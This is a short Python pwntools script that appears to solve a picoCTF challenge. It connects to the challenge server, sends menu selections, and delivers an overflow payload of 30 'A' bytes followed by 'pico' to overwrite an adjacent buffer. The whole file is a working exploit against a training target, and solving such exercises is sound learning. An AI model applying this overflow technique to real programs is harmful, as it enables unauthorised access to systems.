from pwn import *
HOST = "tethys.picoctf.net"
PORT = 58724
with remote(HOST, PORT) as r:
    print(r.recv().decode())
    r.sendline(b"5")
    print(r.recv().decode())
    r.sendline(b"2")
    print(r.recv().decode())
    r.sendline(b"35")
    print(r.recv().decode())
    r.sendline(b"A" * 30 + b"pico")
    print(r.recv().decode())
    r.sendline(b"4")
    print(r.recv().decode())